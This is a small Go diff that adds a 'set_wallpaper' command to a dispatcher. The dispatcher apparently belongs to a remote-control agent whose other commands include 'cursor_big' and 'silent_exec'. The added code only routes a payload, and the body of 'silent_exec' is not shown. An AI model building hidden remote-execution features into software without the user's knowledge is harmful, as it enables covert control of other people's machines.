@@ -2935,6 +2935,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "cursor_big":
 		payload := payloadAsMap(envelope["payload"])
 		return handleCursorBig(ctx, env, cmdID, payload)
+	case "set_wallpaper":
+		payload := payloadAsMap(envelope["payload"])
+		return handleSetWallpaper(ctx, env, cmdID, payload)
 	case "silent_exec":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
